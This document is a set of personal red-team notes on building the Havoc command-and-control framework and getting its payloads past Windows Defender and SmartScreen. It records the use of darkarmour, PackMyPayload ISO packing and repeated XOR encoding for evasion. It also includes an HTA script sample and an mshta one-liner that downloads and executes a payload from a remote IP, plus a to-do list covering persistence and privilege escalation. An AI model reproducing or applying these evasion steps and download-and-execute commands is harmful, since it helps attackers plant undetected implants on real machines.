Building havoc on an ubuntu system - OG$2Up8rx#k7

```
sudo apt install build-essential
sudo add-apt-repository ppa:deadsnakes/ppa
sudo apt update
sudo apt install python3.10 python3.10-dev
```

You can put your teamserver in a VPS whie your client can connect to the teamserver which can be local.

go ver 1.18 is required or above

teamserver installed and ready to go

to run teamserver use in team server directory - `./teamserver server --profile profiles/havoc.yaotl`

the host is the host ip
port is the defualt havoc port - 40056
user would be havoc user default - Neo
password - password1234

able to get a connect back. But unable ot evade antivirus.

next things

1. custom payload
Tried using havoc with darkarmour it runs it is caught by windows defender
![](./havoc_unencrypted.png))

and then using darkarmour evasion was successfull
https://github.com/bats3c/darkarmour
![](./windows_defender_havoc.png)

then created an iso file using packMyPayload
https://github.com/mgeeky/PackMyPayload
![](./iso_smartscreen_bypass.png)

but it only executes from a drive E: privilege. more modules for privilege ecalation must be looked into.

2. how to use multiple vps's
3. eviltwin
4. dll persistance, creating a service
5. create a shellcode for all this and then integrate it with darkarmour
6. generate hta to create something similar to linkzip exploit

https://www.ired.team/offensive-security/code-execution/t1170-mshta-code-execution

```
<html>
<head>
<script language="VBScript"> 
    Sub RunProgram
        Set objShell = CreateObject("Wscript.Shell")
        objShell.Run "calc.exe"
    End Sub
RunProgram()
</script>
</head> 
<body>
    Nothing to see here..
</body>
</html>
```

this did not work 

however creating a download and execute with mshta

`mshta.exe vbscript:Close(Execute("GetObject(""script:http://10.10.6.55:8000/legit.iso"")"))`

![](./mshta_caught.png)


7. creating lnk file

tried doing it through powershell -


this detects can we put it in hta to create a shortcut?

### detection

with cloud based protection after couple of downloads the file is getting detected, lets try for in memory exection apart from xor?

![](./detection_cloud_tamper.png)

### evasion

then again xoring 7 times and creating a exes

![](./xor7_connectback.png)

![](./xor7_evasion.png)

![](./xor7_smartscreen.png)

creating lnk file.
